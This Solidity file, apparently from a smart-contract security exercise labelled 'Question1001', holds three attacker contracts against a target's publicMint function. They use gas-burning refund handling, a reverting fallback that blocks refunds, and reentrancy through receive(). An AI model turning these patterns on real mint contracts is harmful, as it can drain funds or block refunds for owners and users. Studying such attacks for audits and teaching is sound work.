// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
interface Question1001ToAttack {
    function publicMint() external payable;

    function tokenPrice() external returns (uint);
}

contract Question1001Attacker1 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        Question1001ToAttack(target).publicMint{value: msg.value}();
    }

    receive() payable external{
        uint res;
        for(uint i =0 ; i< 100; i++){
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable{

    }
}
contract Question1001Attacker2 {
    address public target;

    constructor(address _target){
        target = _target;
    }

    function attack() external payable{
        Question1001ToAttack(target).publicMint{value: msg.value}();
    }

    fallback() external{
        revert("aaa");
    }
}

contract Question1001Attacker3 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        Question1001ToAttack(target).publicMint{value: msg.value}();
    }

    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            _stack = 0;
        }
    }

    fallback() external payable {}
}